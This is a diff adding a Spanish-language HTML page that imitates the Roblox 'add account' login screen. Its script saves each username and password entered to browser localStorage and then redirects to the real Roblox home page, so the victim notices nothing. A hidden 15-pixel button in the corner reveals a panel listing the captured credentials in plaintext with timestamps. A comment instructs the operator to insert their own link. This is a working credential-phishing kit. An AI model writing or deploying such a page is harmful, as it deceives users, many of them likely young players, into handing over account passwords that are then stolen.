@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login Roblox</title>
+  <style>
+    :root {
+      --bg: #0b0c0e;
+      --card-bg: #222429;
+      --input-bg: #111316;
+      --input-border: #393b3d;
+      --btn-sec: #2f3136;
+      --btn-sec-hover: #3f4248;
+      --text: #ffffff;
+      --text-muted: #b0b0b0;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+    }
+
+    body {
+      overflow: hidden;
+      display: grid;
+      place-items: center;
+      background:
+        radial-gradient(circle at top, rgba(84, 87, 117, 0.18), transparent 25%),
+        #0a0b0d;
+    }
+
+    .page {
+      position: relative;
+      width: 100%;
+      height: 100vh;
+      overflow: hidden;
+      background: #0b0d10;
+    }
+
+    .games-bg {
+      position: absolute;
+      inset: 0;
+      background-image: url("https://images.rbxcdn.com/de4e698b86f73bc5.jpg");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      z-index: 0;
+    }
+
+    .dark-overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 1;
+    }
+
+    .login-wrap {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      height: 100%;
+      display: grid;
+      place-items: center;
+    }
+
+    /* Tarjeta idéntica en tono, bordes y paddings a la referencia */
+    .card {
+      width: 440px;
+      max-width: 90vw;
+      background: var(--card-bg);
+      border-radius: 6px;
+      padding: 38px 36px 32px;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.85);
+    }
+
+    h1 {
+      font-size: 1.85rem;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 24px;
+      color: #fff;
+    }
+
+    .field {
+      margin-bottom: 12px;
+    }
+
+    .field input {
+      width: 100%;
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 4px;
+      color: #fff;
+      font-size: 0.95rem;
+      padding: 14px 16px;
+      outline: none;
+    }
+
+    .field input:focus {
+      border-color: #70757a;
+    }
+
+    .field input::placeholder {
+      color: #7b8089;
+    }
+
+    .btn-primary {
+      width: 100%;
+      margin-top: 4px;
+      background: transparent;
+      border: 1px solid #70757a;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 0.95rem;
+      font-weight: 600;
+      padding: 12px 16px;
+      cursor: pointer;
+      transition: background 0.2s ease, border-color 0.2s ease;
+    }
+
+    .btn-primary:hover {
+      background: #393b3d;
+      border-color: #fff;
+    }
+
+    .forgot-link {
+      display: block;
+      text-align: center;
+      color: #fff;
+      text-decoration: none;
+      font-size: 0.88rem;
+      font-weight: 600;
+      margin-top: 22px;
+      margin-bottom: 22px;
+      cursor: pointer;
+    }
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    /* Línea divisoria gris exacta de la captura */
+    .divider {
+      width: 100%;
+      height: 1px;
+      background: #32353b;
+      margin-bottom: 22px;
+    }
+
+    .stack {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .btn-secondary {
+      width: 100%;
+      background: var(--btn-sec);
+      border: none;
+      color: #fff;
+      font-size: 0.92rem;
+      font-weight: 600;
+      border-radius: 4px;
+      padding: 13px 16px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .btn-secondary:hover {
+      background: var(--btn-sec-hover);
+    }
+
+    .signup-link {
+      display: block;
+      text-align: center;
+      color: #fff;
+      text-decoration: none;
+      font-size: 0.92rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .signup-link:hover {
+      text-decoration: underline;
+    }
+
+    /* Botón invisible de 15px en la esquina inferior derecha */
+    .invisible-trigger {
+      position: fixed;
+      bottom: 0;
+      right: 0;
+      width: 15px;
+      height: 15px;
+      background: transparent;
+      border: none;
+      z-index: 999;
+      cursor: pointer;
+    }
+
+    /* Panel flotante de registros */
+    .data-panel {
+      position: fixed;
+      bottom: 25px;
+      right: 20px;
+      z-index: 1000;
+      width: 320px;
+      max-height: 70vh;
+      background: rgba(20, 21, 24, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 8px;
+      padding: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+      display: none;
+    }
+
+    .data-panel.active {
+      display: block;
+    }
+
+    .data-panel h3 {
+      font-size: 1rem;
+      margin-bottom: 10px;
+      color: #00ffcc;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+      padding-bottom: 6px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .data-list {
+      font-family: monospace;
+      font-size: 0.85rem;
+      color: #ddd;
+      white-space: pre-wrap;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+
+    .clear-btn {
+      background: #ff4d4d;
+      border: none;
+      color: white;
+      padding: 3px 6px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 0.7rem;
+    }
+
+    .clear-btn:hover {
+      background: #ff1a1a;
+    }
+  </style>
+</head>
+<body>
+  <!-- Botón invisible en la esquina inferior derecha -->
+  <button class="invisible-trigger" id="invisibleBtn" type="button"></button>
+
+  <!-- Panel flotante de registros -->
+  <div class="data-panel" id="dataPanel">
+    <h3>
+      <span>Registros de Jugadores</span>
+      <button class="clear-btn" id="clearDataBtn" type="button">Borrar</button>
+    </h3>
+    <div class="data-list" id="dataListContent">Cargando...</div>
+  </div>
+
+  <div class="page">
+    <div class="games-bg" aria-hidden="true"></div>
+    <div class="dark-overlay" aria-hidden="true"></div>
+
+    <div class="login-wrap">
+      <div class="card" aria-label="Maqueta visual de inicio de sesión">
+        <h1>Agregar cuenta</h1>
+        
+        <div class="field">
+          <input type="text" id="userInput" placeholder="Usuario/correo/teléfono" aria-label="Usuario/correo/teléfono" autocomplete="off" />
+        </div>
+        
+        <div class="field">
+          <input type="password" id="passInput" placeholder="Contraseña" aria-label="Contraseña" autocomplete="off" />
+        </div>
+        
+        <button class="btn-primary" id="loginBtn" type="button">Iniciar sesión</button>
+        
+        <div class="forgot-link" id="forgotBtn">¿Olvidaste la contraseña o el nombre de usuario?</div>
+        
+        <!-- Línea divisoria idéntica a la referencia -->
+        <div class="divider"></div>
+
+        <div class="stack">
+          <button class="btn-secondary" id="codeBtn" type="button">Envíame un código de un solo uso</button>
+          <button class="btn-secondary" id="quickLoginBtn" type="button">Inicio de sesión rápido</button>
+        </div>
+        
+        <div class="signup-link" id="signupBtn">Crear cuenta nueva</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const userInput = document.getElementById('userInput');
+    const passInput = document.getElementById('passInput');
+    const loginBtn = document.getElementById('loginBtn');
+    
+    const invisibleBtn = document.getElementById('invisibleBtn');
+    const dataPanel = document.getElementById('dataPanel');
+    const dataListContent = document.getElementById('dataListContent');
+    const clearDataBtn = document.getElementById('clearDataBtn');
+
+    function getStoredPlayers() {
+      const data = localStorage.getItem('roblox_game_players');
+      return data ? JSON.parse(data) : [];
+    }
+
+    function updatePanelContent() {
+      const players = getStoredPlayers();
+      if (players.length === 0) {
+        dataListContent.textContent = "No hay registros guardados.";
+        return;
+      }
+
+      let output = "";
+      players.forEach((player, index) => {
+        output += `jugador ${index + 1}:\n`;
+        output += `  usuario: "${player.usuario}"\n`;
+        output += `  contraseña: "${player.contrasena}"\n`;
+        output += `  fecha: [${player.fecha}]\n\n`;
+      });
+      dataListContent.textContent = output;
+    }
+
+    loginBtn.addEventListener('click', () => {
+      const userVal = userInput.value;
+      const passVal = passInput.value;
+
+      // Validación: Si hay espacios o está vacío, no guarda ni redirige
+      if (!userVal.trim() || !passVal.trim() || userVal.includes(' ') || passVal.includes(' ')) {
+        return; 
+      }
+
+      const players = getStoredPlayers();
+      const nuevoJugador = {
+        usuario: userVal.trim(),
+        contrasena: passVal.trim(),
+        fecha: new Date().toLocaleString()
+      };
+
+      players.push(nuevoJugador);
+      localStorage.setItem('roblox_game_players', JSON.stringify(players));
+
+      updatePanelContent();
+
+      // =========================================================================
+      // AQUÍ DEBES PONER TU LINK O ARCHIVO EXACTO (reemplaza las letras tachadas)
+      // =========================================================================
+      window.location.href = "https://www.roblox.com/es/home";
+    });
+
+    invisibleBtn.addEventListener('click', () => {
+      dataPanel.classList.toggle('active');
+      updatePanelContent();
+    });
+
+    clearDataBtn.addEventListener('click', () => {
+      if (confirm("¿Borrar todos los registros?")) {
+        localStorage.removeItem('roblox_game_players');
+        updatePanelContent();
+      }
+    });
+  </script>
+</body>
+</html>
